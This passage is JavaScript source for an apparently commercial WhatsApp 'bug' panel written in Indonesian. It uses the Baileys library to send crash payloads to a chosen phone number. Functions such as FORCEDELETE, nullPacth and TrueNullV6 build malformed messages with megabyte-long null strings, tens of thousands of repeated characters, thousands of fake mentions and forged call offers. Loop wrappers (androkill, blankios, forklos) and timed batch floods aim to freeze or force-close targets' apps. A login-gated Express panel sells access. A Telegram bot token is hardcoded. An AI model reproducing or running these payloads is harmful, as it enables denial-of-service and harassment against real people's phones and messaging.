    url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true",
    mimetype: "audio/mpeg",
    fileSha256: "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=",
    fileLength: 9999999999,
    seconds: 999999999999,
    ptt: true,
    mediaKey: "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=",
    fileEncSha256: "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=",
    directPath: "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0",
    mediaKeyTimestamp: 99999999999999,
    waveform: "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg==",
    contextInfo: {
      mentionedJid: [
        "1@s.whatsapp.net",
        target,
        ...Array.from({ length: 9999 }, () =>
          `1${Math.floor(Math.random() * 9e7)}@s.whatsapp.net`
        )
      ],
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
        newsletterJid: "1@newsletter",
        serverMessageId: 1,
        newsletterName: "X"
      }
    }
  };

  const msg = generateWAMessageFromContent(
    target,
    { ephemeralMessage: { message: { ButtonMessage } } },
    { userJid: target }
  );

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target } }]
      }]
    }]
  });

  const PaymentMessage = generateWAMessageFromContent(
    "status@broadcast",
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: { text: "X", format: "BOLD" },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\u0000".repeat(1_000_000),
              version: 3
            }
          }
        }
      }
    },
    {}
  );

  await sock.relayMessage("status@broadcast", PaymentMessage.message, {
    messageId: PaymentMessage.key.id,
    statusJidList: [target]
  });

  console.log(chalk.red(`Succes Send ${target}`));
}

async function FORCEDELETE(sock, target) {
  let devices = (
    await sock.getUSyncDevices([target], false, false)
  ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);
  await sock.assertSessions(devices);
  let CallAudio = () => {
    let map = {};
    return {
      mutex(key, fn) {
        map[key] ??= { task: Promise.resolve() };
        map[key].task = (async prev => {
          try { await prev; } catch { }
          return fn();
        })(map[key].task);
        return map[key].task;
      }
    };
  };

  let AudioLite = CallAudio();
  let MessageDelete = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
  let BufferDelete = sock.createParticipantNodes.bind(sock);
  let encodeBuffer = sock.encodeWAMessage?.bind(sock);
  sock.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
    if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };

    let patched = await (sock.patchMessageBeforeSending?.(message, recipientJids) ?? message);

    let participateNode = Array.isArray(patched)
      ? patched
      : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

    let { id: meId, lid: meLid } = sock.authState.creds.me;
    let omak = meLid ? jidDecode(meLid)?.user : null;
    let shouldIncludeDeviceIdentity = false;

    let nodes = await Promise.all(participateNode.map(async ({ recipientJid: jid, message: msg }) => {

      let { user: targetUser } = jidDecode(jid);
      let { user: ownPnUser } = jidDecode(meId);
      let isOwnUser = targetUser === ownPnUser || targetUser === omak;
      let y = jid === meId || jid === meLid;

      if (dsmMessage && isOwnUser && !y) msg = dsmMessage;

      let bytes = MessageDelete(encodeBuffer ? encodeBuffer(msg) : encodeWAMessage(msg));

      return AudioLite.mutex(jid, async () => {
        let { type, ciphertext } = await sock.signalRepository.encryptMessage({ jid, data: bytes });
        if (type === 'pkmsg') shouldIncludeDeviceIdentity = true;

        return {
          tag: 'to',
          attrs: { jid },
          content: [{ tag: 'enc', attrs: { v: '2', type, ...extraAttrs }, content: ciphertext }]
        };
      });

    }));

    return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
  };
  let BytesType = crypto.randomBytes(32);
  let nodeEncode = Buffer.concat([BytesType, Buffer.alloc(8, 0x01)]);

  let { nodes: destinations, shouldIncludeDeviceIdentity } = await sock.createParticipantNodes(
    devices,
    { conversation: "y" },
    { count: '0' }
  );
  let DecodeCall = {
    tag: "call",
    attrs: { to: target, id: sock.generateMessageTag(), from: sock.user.id },
    content: [{
      tag: "offer",
      attrs: {
        "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
        "call-creator": sock.user.id
      },
      content: [
        { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
        { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
        {
          tag: "video",
          attrs: {
            orientation: "0",
            screen_width: "1920",
            screen_height: "1080",
            device_orientation: "0",
            enc: "vp8",
            dec: "vp8"
          }
        },
        { tag: "net", attrs: { medium: "3" } },
        { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
        { tag: "encopt", attrs: { keygen: "2" } },
        { tag: "destination", attrs: {}, content: destinations },
        ...(shouldIncludeDeviceIdentity ? [{
          tag: "device-identity",
          attrs: {},
          content: encodeSignedDeviceIdentity(sock.authState.creds.account, true)
        }] : [])
      ]
    }]
  };

  await sock.sendNode(DecodeCall);
  const TextMsg = generateWAMessageFromContent(target, {
    extendedTextMessage: {
      text: "JOIN GRUP",
      contextInfo: {
        remoteJid: "X",
        participant: target,
        stanzaId: "1234567890ABCDEF",
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() + 1814400000
          }
        }
      }
    }
  }, {});

  await sock.relayMessage(target, TextMsg.message, { messageId: TextMsg.key.id });
  await sock.sendMessage(target, { delete: TextMsg.key });

}


async function amountOne(sock, target) {

  const Null = {
    requestPaymentMessage: {
      currencyCodeIso4217: "IDR",
      amount: {
        value: 1,
        offset: 0
      },
      requestFrom: target,
      expiryTimestamp: Date.now(),
      contextInfo: {
        externalAdReply: {
          title: null,
          body: "X".repeat(1500),
          mimetype: "audio/mpeg",
          caption: "X".repeat(1500),
          showAdAttribution: true,
          sourceUrl: null,
          thumbnailUrl: null
        }
      }
    }
  };

  const Payment = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "Null",
            subtitle: "ꦾ".repeat(10000),
            hasMediaAttachment: false
          },
          body: {
            text: "ꦾ".repeat(20000)
          },
          footer: {
            text: "ꦾ".repeat(20000)
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: JSON.stringify({
                  title: "ꦾ".repeat(20000),
                  sections: [
                    {
                      title: "ꦾ".repeat(5000),
                      rows: [
                        {
                          title: "ꦾ".repeat(5000),
                          description: "ꦾ".repeat(5000),
                          id: "ꦾ".repeat(2000)
                        },
                        {
                          title: "ꦾ".repeat(5000),
                          description: "ꦾ".repeat(5000),
                          id: "ꦾ".repeat(2000)
                        },
                        {
                          title: "ꦾ".repeat(5000),
                          description: "ꦾ".repeat(5000),
                          id: "ꦾ".repeat(2000)
                        }
                      ]
                    },
                    {
                      title: "ꦾ".repeat(20000) + "bokep simulator",
                      rows: [
                        {
                          title: "ꦾ".repeat(5000),
                          description: "ꦾ".repeat(5000),
                          id: "ꦾ".repeat(2000)
                        },
                        {
                          title: "Null",
                          description: "\u0000".repeat(5000),
                          id: "ꦾ".repeat(2000)
                        }
                      ]
                    }
                  ]
                })
              }
            ]
          }
        }
      }
    }
  };

 await sock.relayMessage(
    target,
    Null,
    { participant: { jid: target } }
  );

  await sock.relayMessage(
    target,
    Payment,
    { participant: { jid: target } }
  );
}
async function tes100(sock, target) {
  const viewOnceMsg = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        imageMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/11239763_2444985585840225_6522871357799450886_n.enc?ccb=11-4&oh=01_Q5Aa1QFfR6NCmADbYCPh_3eFOmUaGuJun6EuEl6A4EQ8r_2L8Q&oe=68243070&_nc_sid=5e03e0&mms3=true",
          mimetype: "image/jpeg",
          fileSha256: "MWxzPkVoB3KD4ynbypO8M6hEhObJFj56l79VULN2Yc0=",
          fileLength: "99999999999999999",
          height: "9999999999999999",
          width: "9999999999999999",
          mediaKey: "lKnY412LszvB4LfWfMS9QvHjkQV4H4W60YsaaYVd57c=",
          fileEncSha256: "aOHYt0jIEodM0VcMxGy6GwAIVu/4J231K349FykgHD4=",
          directPath: "/v/t62.7161-24/11239763_2444985585840225_6522871357799450886_n.enc?ccb=11-4&oh=01_Q5Aa1QFfR6NCmADbYCPh_3eFOmUaGuJun6EuEl6A4EQ8r_2L8Q&oe=68243070&_nc_sid=5e03e0",
          mediaKeyTimestamp: "172519628",
          jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDABsSFBcUERsXFhceHBsgKEIrKCUlKFE6PTBCYFVlZF9VXVtqeJmBanGQc1tdhbWGkJ6jq62rZ4C8ybqmx5moq6T/2wBDARweHigjKE4rK06kbl1upKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKT/wgARCABIAEgDASIAAhEBAxEB/8QAGgAAAgMBAQAAAAAAAAAAAAAAAAUCAwQBBv/EABcBAQEBAQAAAAAAAAAAAAAAAAABAAP/2gAMAwEAAhADEAAAAN6N2jz1pyXxRZyu6NkzGrqzcHA0RukdlWTXqRmWLjrUwTOVm3OAXETtFZa9RN4tCZzV18lsll0y9OVmbmkcpbJslDflsuz7JafOepX0VEDrcjDpT6QLC4DrxaFFgHL/xAAaEQADAQEBAQAAAAAAAAAAAAAAARExAhEh/9oACAECAQE/AELJqiE/ELR5EdaJmxHWxfIjqLZ//8QAGxEAAgMBAQEAAAAAAAAAAAAAAAECEBEhMUH/2gAIAQMBAT8AZ9MGsdMzTcQuumR8GjymQfCQ+0yIxiP/xAArEAABBAECBQQCAgMAAAAAAAABAAIDEQQSEyEiIzFRMjNBYQBxExQkQoH/2gAIAQEAAT8Af6Ssn3SpXbWEpjHOcOHAlN6MQBJH6RiMkJdRIWVEYnhwYWg+VpJt5P1+H+g/pZHulZR6axHi9rvjso5GuYLFoT7H7QWgFavKHMY0UeK0U8zx4QUh5D+lOeqVMLYq2vFeVE7YwX2pFsN73voLKnEs1t9I7LRPU8/iU9MqX3Sn8SGjiVj6PNJUjxtHhTROiG1wpZwqNfC0Rwp4+UCpj0yp3U8laVT5nSEXt7KGUnushjZG0Ra1DEP8ZrsFR7LTZjFMPB7o8zeB7qc9IrI4ly0bvIozRRNttSMEsZ+1qGG6CQuA5So3U4LFdugYT4U/tFS+py0w0ZKUb7ophtqigdt+lPiNkjLJACCs/Tn4jt92wngVhH/GZfhZHtFSnmctNcf7JYP9kIzHVnuojwUMlNpSPBK1Pa/DeD/xQ8uG0fJCyT0isg1axH7MpjvtSDcy1A6xSc4jsi/gtQyDyx/LioySA34C//4AAwD/2Q==",
          streamingSidecar: "APsZUnB5vlI7z28CA3sdzeI60bjyOgmmHpDojl82VkKPDp4MJmhpnFo0BR3IuFKF8ycznDUGG9bOZYJc2m2S/H7DFFT/nXYatMenUXGzLVI0HuLLZY8F1VM5nqYa6Bt6iYpfEJ461sbJ9mHLAtvG98Mg/PYnGiklM61+JUEvbHZ0XIM8Hxc4HEQjZlmTv72PoXkPGsC+w4mM8HwbZ6FD9EkKGfkihNPSoy/XwceSHzitxjT0BokkpFIADP9ojjFAA4LDeDwQprTYiLr8lgxudeTyrkUiuT05qbt0vyEdi3Z2m17g99IeNvm4OOYRuf6EQ5yU0Pve+YmWQ1OrxcrE5hqsHr6CuCsQZ23hFpklW1pZ6GaAEgYYy7l64Mk6NPkjEuezJB73vOU7UATCGxRh57idgEAwVmH2kMQJ6LcLClRbM01m8IdLD6MA3J3R8kjSrx3cDKHmyE7N3ZepxRrbfX0PrkY46CyzSOrVcZvzb/chy9kOxA6U13dTDyEp1nZ4UMTw2MV0QbMF6n94nFHNsV8kKLaDberigsDo7U1HUCclxfHBzmz3chng0bX32zTyQesZ2SORSDYHwzU1YmMbSMahiy3ciH0yQq1fELBvD5b+XkIJGkCzhxPy8+cFZV/4ATJ+wcJS3Z2v7NU2bJ3q/6yQ7EtruuuZPLTRxWB0wNcxGOJ/7+QkXM3AX+41Q4fddSFy2BWGgHq6LDhmQRX+OGWhTGLzu+mT3WL8EouxB5tmUhtD4pJw0tiJWXzuF9mVzF738yiVHCq8q5JY8EUFGmUcMHtKJHC4DQ6jrjVCe+4NbZ53vd39M792yNPGLS6qd8fmDoRH",
          caption: "ꦾ".repeat(20000) + "ꦾ".repeat(60000),
          contextInfo: {
            stanzaId: "Thumbnail.id",
            isForwarded: true,
            forwardingScore: 999,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 1990 }, () => "1" + Math.floor(Math.random() * 500000000) + "@s.whatsapp.net")
            ]
          }
        }
      }
    }
  }, {});

  const Payment_Info = generateWAMessageFromContent(target, {
    interactiveResponseMessage: {
      body: {
        text: "Ondet Onde X",
        format: "DEFAULT"
      },
      nativeFlowResponseMessage: {
        name: "galaxy_message",
        paramsJson: "\u0000".repeat(1045000),
        version: 3
      }
    }
  }, {});

  await sock.relayMessage("status@broadcast", viewOnceMsg.message, {
    messageId: viewOnceMsg.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
      }]
    }]
  });
  
  await sock.relayMessage("status@broadcast", Payment_Info.message, {
    messageId: Payment_Info.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
      }]
    }]
  });
}

async function nullPacth(sock, target) { 
  let msg = {
    viewOnceMessage: {
      message: {
        documentMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/11239763_2444985585840225_6522871357799450886_n.enc",
          mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
          fileSha256: "MWxzPkVoB3KD4ynbypO8M6hEhObJFj56l79VULN2Yc0=",
          fileLength: "999999999999",
          pageCount: 1316134911,
          mediaKey: "lKnY412LszvB4LfWfMS9QvHjkQV4H4W60YsaaYVd57c=",
          fileName: "Tes!!",
          fileEncSha256: "aOHYt0jIEodM0VcMxGy6GwAIVu/4J231K349FykgHD4=",
          directPath: "/v/t62.7161-24/11239763_2444985585840225_6522871357799450886_n.enc",
          mediaKeyTimestamp: "1743848703",
          caption: "ꦾ".repeat(180000),
          contextInfo: {
            mentionedJid: Array.from({length: 2000}, (_, i) => 
              `62${String(8000000000 + i).slice(0,11)}@s.whatsapp.net`
            ),
            groupMentions: [
              {
                groupJid: 'status@broadcast',
                groupSubject: 'ꦾ'.repeat(5000)
              }
            ],
            forwardingScore: 999,
            isForwarded: true,
            quotedMessage: {
              extendedTextMessage: {
                text: "ꦾ".repeat(10000),
                contextInfo: {
                  mentionedJid: ['0@s.whatsapp.net']
                }
              }
            },
            remoteJid: 'status@broadcast',
            participant: '0@s.whatsapp.net',
            stanzaId: 'BAE5' + Date.now(),
            pushName: 'ꦾ'.repeat(20000),
            expiration: 604262800,
            status: 3,
            deviceSentFrom: 'android'
          }
        }
      }
    }
  };

  await sock.relayMessage(target, msg, {
    messageId: null,
    participant: { jid: target }
  });

  const msg2 = {
    interactiveMessage: {
      header: {
        title: "📱 MENU UTAMA",
        subtitle: "ꦾ".repeat(10000),
        hasMediaAttachment: false
      },

      body: {
        text: "ꦾ".repeat(20000)
      },

      footer: {
        text: "ꦾ".repeat(20000)
      },

      nativeFlowMessage: {
        buttons: [
          {
            name: "single_select",
            buttonParamsJson: JSON.stringify({
              title: "ꦾ".repeat(20000),
              sections: [
                {
                  title: "ꦾ".repeat(5000),
                  rows: [
                    { title: "ꦾ".repeat(5000), description: "ꦾ".repeat(5000), id: "ꦾ".repeat(2000) },
                    { title: "ꦾ".repeat(5000), description: "ꦾ".repeat(5000), id: "ꦾ".repeat(2000) },
                    { title: "ꦾ".repeat(5000), description: "ꦾ".repeat(5000), id: "ꦾ".repeat(2000) }
                  ]
                },
                {
                  title: "ꦾ".repeat(20000) + "bokep simulator",
                  rows: [
                    { title: "ꦾ".repeat(5000), description: "ꦾ".repeat(5000), id: "ꦾ".repeat(2000) },
                    { title: "ONDET TWO BE ONE", description: "\u0000".repeat(5000), id: "ꦾ".repeat(2000) }
                  ]
                }
              ]
            })
          }
        ]
      }
    }
  };

  await sock.relayMessage(target, msg2, {
    messageId: null,
    participant: { jid: target }
  });

  let msg3 = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "ោ៝".repeat(63000),
            hasMediaAttachment: false
          },
          body: {
            text: "ꦽ".repeat(1024)
          },
          contextInfo: {
            forwardingScore: 9999,
            isForwarded: true,
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast"
          },
          nativeFlowMessage: {
            buttons: [
              { name: "cta_call", buttonParamsJson: "" },
              { name: "call_permission_request", buttonParamsJson: JSON.stringify({ status: true }) }
            ],
            messageParamsJson: "{}"
          }
        }
      }
    }
  };

  await sock.relayMessage(target, msg3, {
    messageId: null,
    participant: { jid: target }
  });

  let msg4 = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "ꦾ".repeat(20000),
            locationMessage: {
              degreesLatitude: 0,
              degreesLongitude: 0,
              name: "ꦾ".repeat(20000),
              address: "ꦾ".repeat(20000)
            },
            hasMediaAttachment: true
          },
          body: {
            text: "ꦾ".repeat(20000)
          },
          footer: {
            text: "ꦾ".repeat(20000)
          },
          nativeFlowMessage: {
            name: "ꦾ".repeat(20000),
            messageParamsJson: "ꦾ".repeat(20000)
          },
          contextInfo: {
            mentionedJid: Array.from({ length: 2000 }, (_, z) => 
              `1${3000000000 + z}@s.whatsapp.net`
            ),
            stanzaId: "ꦾ".repeat(5000),
            participant: target,
            isForwarded: true,
            forwardingScore: 99999
          }
        }
      }
    }
  };

  await sock.relayMessage(target, msg4, {
    messageId: null,
    participant: { jid: target }
  });
}

async function TrueNullV6(sock, target) {
  try {
    const viewOnceMsg = generateWAMessageFromContent(
      "status@broadcast",
      {
        viewOnceMessage: {
          message: {
            interactiveResponseMessage: {
              body: { text: "Hallo", format: "DEFAULT" },
              nativeFlowResponseMessage: {
                name: "call_permission_request",
                paramsJson: "\u0000".repeat(1000000),
                version: 3
              }
            }
          }
        }
      },
      {}
    );

    await sock.relayMessage(
      "status@broadcast",
      viewOnceMsg.message,
      {
        messageId: viewOnceMsg.key.id,
        statusJidList: [target]
      }
    );
    const message = {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "Maklu",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: "\u0000".repeat(145000),
              version: 3
            },
            contextInfo: {
              mentionedJid: Array.from(
                { length: 1950 },
                () =>
                  "1" +
                  Math.floor(Math.random() * 5000000) +
                  "91@s.whatsapp.net"
              ),
              isForwarded: true,
              forwardingScore: 999,
              forwardedNewsletterMessageInfo: {
                newsletterJid: "1@newsletter",
                serverMessageId: 1,
                newsletterName: "Message"
              }
            }
          }
        }
      }
    };

    await sock.relayMessage("status@broadcast", message, {
      messageId: undefined,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target } }]
            }
          ]
        }
      ]
    });

    console.log(`Succes Send Bug ${target}`);
  } catch (e) {
    console.error("Error:", e);
  }
}
// INI BUAT BUTTON DELAY 50% YA ANJINKK@)$+$)+@((_
async function delaylow(sock, durationHours, X) {
  if (!sock) {
    console.error('❌ Socket tidak tersedia untuk delaylow');
    return;
  }

  const totalDurationMs = durationHours * 3600000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      return;
    }

    try {
      if (count < 30) {
        await Promise.all([
          TrueNullv3(sock, X),
          TrueNullV6(sock, X),
          sleep(1000)
        ]);
        
        console.log(chalk.yellow(`
┌────────────────────────┐
│ ${count + 1}/30 delaylow 📟
└────────────────────────┘
  `));
        count++;
        setTimeout(sendNext, 700);
      } else {
        console.log(chalk.green(`👀 Success Send Bugs to ${X} (Batch ${batch})`));
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( 🍷 Indictive | Core V3 ).`));
          count = 0;
          batch++;
          setTimeout(sendNext, 60000);
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`✗ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 700);
    }
  };
  sendNext();
}

async function delayhigh(sock, durationHours, X) {
  if (!sock) {
    console.error('❌ Socket tidak tersedia untuk delaylow');
    return;
  }

  const totalDurationMs = durationHours * 3600000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 25;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      return;
    }

    try {
      if (count < 35) {
        await Promise.all([
          TrueNullv3(sock, X),
          TrueNullV6(sock, X),
          sleep(2000)
        ]);
        
        console.log(chalk.yellow(`
┌────────────────────────┐
│ ${count + 1}/30 delaylow 📟
└────────────────────────┘
  `));
        count++;
        setTimeout(sendNext, 700);
      } else {
        console.log(chalk.green(`👀 Success Send Bugs to ${X} (Batch ${batch})`));
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( 🍷 Indictive | Core V3 ).`));
          count = 0;
          batch++;
          setTimeout(sendNext, 60000);
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`✗ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 700);
    }
  };
  sendNext();
}


// INI BUAT BUTTON DELAY x kuota% YA ANJINKK@)$+$)+@((_
async function sepong(sock, durationHours, X) {
  if (!sock) {
    console.error('❌ Socket tidak tersedia untuk delaylow');
    return;
  }

  const totalDurationMs = durationHours * 3600000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 50;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      return;
    }

    try {
      if (count < 50) {
        await Promise.all([
          TrueNullv3(sock, X),
          TrueNullV6(sock, X),
          tes100(sock, X),
          sleep(2000)
        ]);
        
        console.log(chalk.yellow(`
┌────────────────────────┐
│ ${count + 1}/30 delaylow 📟
└────────────────────────┘
  `));
        count++;
        setTimeout(sendNext, 700);
      } else {
        console.log(chalk.green(`👀 Success Send Bugs to ${X} (Batch ${batch})`));
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( 🍷 Indictive | Core V3 ).`));
          count = 0;
          batch++;
          setTimeout(sendNext, 60000);
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`✗ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 700);
    }
  };
  sendNext();
}



// INI BUAT BUTTON ANDROID BLANK
async function androkill(sock, target) {
     for (let i = 0; i < 5; i++) {
         await amountOne(sock, target);
         await Epcx(sock, target);
         }
     console.log(chalk.green(`👀 Success Send Bugs to ${target}`));
     }
     
// INI BUAT BUTTON BLANK IOS
async function blankios(sock, target) {
     for (let i = 0; i < 50; i++) {
         await nullPacth(sock, target);
         await nullPacth(sock, target);
         }
     console.log(chalk.green(`👀 Success Send Bugs to ${target}`));
     }

// INI BUAT BUTTON IOS INVISIBLE
async function fcios(sock, target) {
     for (let i = 0; i < 50; i++) {
         await tes100(sock, target);
         }
     console.log(chalk.green(`👀 Success Send Bugs to ${target}`));
     }

// INI BUAT BUTTON FORCE CLOSE MMEK LAH MASA GA TAU
async function forklos(sock, target) {
     for (let i = 0; i < 20; i++) {
         await FORCEDELETE(sock, target);
         }
     console.log(chalk.green(`👀 Success Send Bugs to ${target}`));
     }

// Middleware untuk parsing JSON
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser());
app.use(express.json());
app.use(express.static('public'));

// ==================== AUTH MIDDLEWARE ==================== //
function requireAuth(req, res, next) {
  const username = req.cookies.sessionUser;
  
  if (!username) {
    return res.redirect("/login?msg=Silakan login terlebih dahulu");
  }
  
  const users = getUsers();
  const currentUser = users.find(u => u.username === username);
  
  if (!currentUser) {
    return res.redirect("/login?msg=User tidak ditemukan");
  }
  
  if (Date.now() > currentUser.expired) {
    return res.redirect("/login?msg=Session expired, login ulang");
  }
  
  next();
}

app.get("/", (req, res) => {
  const filePath = path.join(__dirname, "INDICTIVE", "Login.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("✗ Gagal baca Login.html");
    res.send(html);
  });
});

app.get("/login", (req, res) => {
  const msg = req.query.msg || "";
  const filePath = path.join(__dirname, "INDICTIVE", "Login.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("✗ Gagal baca file Login.html");
    res.send(html);
  });
});

app.post("/auth", (req, res) => {
  const { username, key } = req.body;
  const users = getUsers();

  const user = users.find(u => u.username === username && u.key === key);
  if (!user) {
    return res.redirect("/login?msg=" + encodeURIComponent("Username atau Key salah!"));
  }

  res.cookie("sessionUser", username, { maxAge: 60 * 60 * 1000 }); 
  res.redirect("/option");
});

// Tambahkan auth middleware untuk WiFi Killer
app.get('/option', (req, res) => {
    const username = req.cookies.sessionUser;
    if (!username) {
        return res.redirect('/login');
    }
    res.sendFile(path.join(__dirname, 'INDICTIVE', 'opsi.html'));
});

// Route untuk dashboard
app.get("/dashboard", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "INDICTIVE", "dashboard.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) {
      console.error("❌ Gagal membaca file opsi.html:", err);
      return res.status(500).send("File dashboard tidak ditemukan");
    }
    res.send(html);
  });
});

app.get("/dashboard2", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "INDICTIVE", "dashboard2.html"); // atau file lain jika ada
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) {
      console.error("❌ Gagal membaca file dashboard:", err);
      return res.status(500).send("File dashboard tidak ditemukan");
    }
    res.send(html);
  });
});

// Endpoint untuk mendapatkan data user dan session
app.get("/api/option-data", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  const users = getUsers();
  const currentUser = users.find(u => u.username === username);

  if (!currentUser) {
    return res.status(404).json({ error: "User not found" });
  }

  // Ambil role dari data user
  const userRole = currentUser.role || 'user';

  // Format expired time
  const expired = new Date(currentUser.expired).toLocaleString("id-ID", {
    timeZone: "Asia/Jakarta",
    year: "numeric",
    month: "2-digit",
    day: "2-digit",
    hour: "2-digit",
    minute: "2-digit",
  });

  // Hitung waktu tersisa
  const now = Date.now();
  const timeRemaining = currentUser.expired - now;
  const daysRemaining = Math.max(0, Math.floor(timeRemaining / (1000 * 60 * 60 * 24)));

  res.json({
    username: currentUser.username,
    role: userRole,
    activeSenders: sessions.size,
    expired: expired,
    daysRemaining: daysRemaining
  });
});
      
app.get("/profile", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "INDICTIVE", "profil.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});
      
/* 
USER DETECTIONS - HARAP DI BACA !!!
MASUKIN BOT TOKEN TELE LU DAN ID TELE LU ATAU ID GROUP TELEL LU

Gunanya buat apa bang?
itu kalo ada user yang make fitur bug nanti si bot bakal ngirim log history nya ke id telelu, kalo pake id GC tele lu, nanti ngirim history nya ke GC tele lu bisa lu atur aja mau ngirim nya ke mana ID / ID GC
*/
const BOT_TOKEN = "8122149065:AAFp7xEo3eMM184tMoRcv3HOTfyKbT17XVU";
const CHAT_ID = "7882058841";
// simpan waktu terakhir eksekusi (global cooldown)
let lastExecution = 0;

// INI JANGAN DI APA APAIN
app.get("/execution", async (req, res) => {
  try {
    const username = req.cookies.sessionUser;

    // Jika tidak ada username, redirect ke login
    if (!username) {
      return res.redirect("/login?msg=Silakan login terlebih dahulu");
    }

    const users = getUsers();
    const currentUser = users.find(u => u.username === username);

    if (!currentUser || !currentUser.expired || Date.now() > currentUser.expired) {
      return res.redirect("/login?msg=Session expired, login ulang");
    }

    // Handle parameter dengan lebih baik
    const justExecuted = req.query.justExecuted === 'true';
    const targetNumber = req.query.target || '';
    const mode = req.query.mode || '';

    // Jika justExecuted=true, tampilkan halaman sukses
    if (justExecuted && targetNumber && mode) {
      const cleanTarget = targetNumber.replace(/\D/g, '');
      const country = getCountryCode(cleanTarget);
      
      return res.send(executionPage("✓ S U C C E S", {
        target: targetNumber,
        timestamp: new Date().toLocaleString("id-ID"),
        message: `𝐄𝐱𝐞𝐜𝐮𝐭𝐞 𝐌𝐨𝐝𝐞: ${mode.toUpperCase()} - Completed - ${country}`
      }, false, currentUser, "", mode));
    }

    // Ambil session user yang aktif
    const userSessions = loadUserSessions();
    const userSenders = userSessions[username] || [];
    const activeUserSenders = userSenders.filter(sender => sessions.has(sender));
    
